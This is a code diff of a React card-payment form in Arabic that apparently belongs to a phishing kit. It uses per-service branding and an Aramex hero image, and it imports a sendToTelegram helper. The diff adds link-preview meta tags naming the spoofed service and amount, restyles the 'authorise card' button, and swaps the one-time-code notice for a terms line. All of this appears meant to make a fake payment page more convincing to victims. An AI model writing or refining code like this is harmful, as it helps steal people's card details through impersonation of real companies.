@@ -6,8 +6,9 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
-import { Shield, CreditCard, AlertCircle } from "lucide-react";
+import { Shield, CreditCard, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import heroAramex from "@/assets/hero-aramex.jpg";
@@ -156,11 +157,18 @@ const PaymentCardForm = () => {
   };
   
   return (
-    <div 
-      className="min-h-screen bg-background"
-      dir="rtl"
-    >
-      {/* Hero Section */}
+    <>
+      <PaymentMetaTags 
+        serviceName={serviceName}
+        amount={formattedAmount}
+        title={`بيانات البطاقة - ${serviceName}`}
+        description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
+      />
+      <div 
+        className="min-h-screen bg-background"
+        dir="rtl"
+      >
+        {/* Hero Section */}
       <div className="relative w-full h-48 sm:h-64 overflow-hidden">
         <img 
           src={heroImage}
@@ -192,10 +200,10 @@ const PaymentCardForm = () => {
         </div>
       </div>
 
-      <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
-        <div className="max-w-2xl mx-auto">
-          
-          <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
+        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
+          <div className="max-w-2xl mx-auto">
+            
+            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
             <div className="flex items-center justify-between mb-6 sm:mb-8">
               <h1 className="text-xl sm:text-3xl font-bold">بيانات البطاقة</h1>
               
@@ -359,17 +367,17 @@ const PaymentCardForm = () => {
               <Button
                 type="submit"
                 size="lg"
-                className="w-full text-base sm:text-xl py-6 sm:py-7 mt-6 font-bold text-white"
+                className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                 style={{
                   background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                 }}
               >
-                <Shield className="w-5 h-5 sm:w-6 sm:h-6 ml-2" />
-                <span>تفويض البطاقة</span>
+                <span className="ml-2">تفويض البطاقة</span>
+                <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
               </Button>
               
-              <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3">
-                سيتم إرسال رمز التحقق إلى هاتفك المسجل
+              <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
+                بالمتابعة، أنت توافق على الشروط والأحكام
               </p>
             </form>
           
@@ -388,7 +396,7 @@ const PaymentCardForm = () => {
           </Card>
         </div>
       </div>
-    </div>
+    </>
   );
 };
 
